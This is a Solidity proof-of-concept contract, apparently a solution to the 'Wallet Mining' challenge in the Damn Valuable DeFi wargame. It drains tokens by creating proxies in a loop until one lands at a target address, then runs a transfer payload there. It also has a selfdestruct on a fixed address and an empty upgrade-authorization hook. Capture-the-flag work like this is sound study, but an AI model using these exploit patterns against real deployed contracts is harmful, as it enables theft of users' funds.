// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./WalletDeployer.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract Walletmining_POC is UUPSUpgradeable {
    function exploit(address _token, address _player) external {
        DamnValuableToken(_token).transfer(_player, 20000000 ether);
    }

    function exploit2() external {
        address payable addr = payable(address(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B));
        selfdestruct(addr);
    }

    function drain(address fac, address token) external {
        bytes memory payload = abi.encodeWithSignature("exploit(address,address)", token, msg.sender);
        for (uint256 i = 1; i < 45; i++) {
            if (i == 43) {
                IGnosisSafeProxyFactory(fac).createProxy(address(this), payload);
            }
            IGnosisSafeProxyFactory(fac).createProxy(address(this), "");
        }
    }

    function _authorizeUpgrade(address imp) internal override {}
}